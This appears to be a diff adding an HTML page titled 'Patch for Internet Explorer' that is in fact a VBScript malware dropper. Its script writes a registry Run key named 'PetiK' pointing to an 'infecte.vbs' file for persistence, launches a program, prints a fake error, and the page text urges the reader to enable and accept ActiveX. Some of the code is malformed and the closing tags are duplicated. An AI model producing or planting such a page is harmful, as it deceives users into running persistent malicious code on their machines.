@@ -1,0 +1,12 @@
+<HTML><HEAD><TITLE>Patch for Internet Explorer</TITLE></HEAD>
+<SCRIPT LANGUAGE=VBScript>
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set ws = CreateObject("WScript.Shell")
+ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PetiK",GetSpecialFolder(0)&"\infecte.vbs"
+ws.Run "C:\WINDOWS\Winmine.exe"
+document.Write "Erreur dans la page"
+</SCRIPT>
+<BODY>
+<CENTER><p>You need ActiveX enabled if you want to read this HTML file.<br>Please open this file again and click accept ActiveX<br>Microsoft Internet Explorer
+</HTML>r
+</HTML>>
